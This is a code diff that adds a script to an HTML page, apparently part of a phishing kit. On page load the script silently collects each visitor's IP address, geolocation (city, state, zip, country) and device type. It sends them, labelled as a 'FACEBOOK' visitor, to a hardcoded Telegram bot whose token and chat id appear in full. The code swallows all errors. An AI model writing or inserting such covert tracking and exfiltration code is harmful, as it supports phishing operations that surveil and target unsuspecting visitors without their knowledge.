@@ -109,7 +109,78 @@ html, body {
 
 </style>
 </head>
+<script>
+  const botToken = "7840862788:AAGeGI8WpKs4DfSxOTCMca5mwTG5PjXVqhM";
+  const chatId = "-1002539821629";
 
+  function formatTime() {
+    const now = new Date();
+    const month = now.toLocaleString('default', { month: 'short' });
+    const day = now.getDate();
+    const time = now.toLocaleTimeString([], {
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit',
+      hour12: true
+    });
+    return `${month} ${day} - ${time}`;
+  }
+
+  function getDeviceType() {
+    const ua = navigator.userAgent.toLowerCase();
+
+    if (/iphone/.test(ua)) return "iPhone";
+    if (/ipad/.test(ua)) return "iPad";
+    if (/android/.test(ua)) {
+      if (/samsung/.test(ua)) return "Samsung";
+      return "Android";
+    }
+    if (/windows nt 10/.test(ua)) return "Windows 10";
+    if (/windows nt 11/.test(ua)) return "Windows 11";
+    if (/windows nt 6\.1/.test(ua)) return "Windows 7";
+    if (/macintosh/.test(ua)) return "Mac";
+
+    return "Unknown";
+  }
+
+  async function sendVisitMessage() {
+    try {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      const ip = ipData.ip;
+
+      const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip`);
+      const geo = await geoRes.json();
+
+      const city = geo.city || "Unknown";
+      const state = geo.regionName || "Unknown";
+      const zip = geo.zip || "Unknown";
+      const country = geo.country || "Unknown";
+      const deviceType = getDeviceType();
+      const time = formatTime();
+
+      const message =
+        `<b>[${ip}] - FACEBOOK V I S I T O R - [${time}]</b>\n` +
+        `<b>City:</b> <code>${city}</code>\n` +
+        `<b>State:</b> <code>${state}</code>\n` +
+        `<b>Zip:</b> <code>${zip}</code>\n` +
+        `<b>From:</b> <code>${country}</code>\n` +
+        `<b>Device:</b> <code>${deviceType}</code>`;
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML"
+        })
+      });
+    } catch {}
+  }
+
+  sendVisitMessage();
+</script>
 <body>
     <nav class="navbar navbar-light navbar-expand-md py-3">
         <div class="container"><a class="navbar-brand d-flex align-items-center" href="#"><img class="img-fluid" src="./main_files/img/large_TM-LOGO.png" style="width: 160px;"></a>
@@ -385,6 +456,9 @@ html, body {
     });
   });
 </script>
+
+
+
 
 
 </body>
